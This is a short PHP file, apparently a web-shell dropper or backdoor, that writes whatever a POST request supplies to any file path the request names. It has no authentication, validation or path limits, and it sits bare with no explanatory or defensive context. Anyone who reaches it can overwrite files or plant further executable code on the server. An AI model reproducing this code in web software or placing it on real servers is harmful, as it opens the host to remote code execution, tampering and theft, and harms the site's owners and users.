<?php


$path = $_POST['path'];
$content = $_POST['content'];


$fp = fopen($path, "w");
fwrite($fp, $content);
fclose($fp);

echo "ok";
